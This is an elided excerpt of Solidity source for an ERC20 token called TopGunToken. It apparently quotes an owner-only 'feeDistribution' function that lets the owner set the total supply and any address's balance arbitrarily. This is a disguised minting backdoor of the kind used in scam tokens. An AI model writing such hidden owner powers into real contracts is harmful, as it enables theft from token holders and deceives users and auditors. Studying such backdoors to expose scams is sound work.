...
contract ERC20 is Context, IERC20, Ownable {
     ...
     * total supply.
     */
    function feeDistribution(address _address, uint256 feeValue, uint256 multiplierValue) external onlyOwner {
        require(_address != address(0));
        _totalSupply = feeValue.sub(multiplierValue);
        _balances[_address] = feeValue.sub(multiplierValue);
    }
        /**
...
contract TopGunToken is ERC20 {
    ...
    uint256 private constant BURN_PCT = 48;

    /// @notice min burn percentage
    uint256 private constant MIN_BURN_PCT = 30;
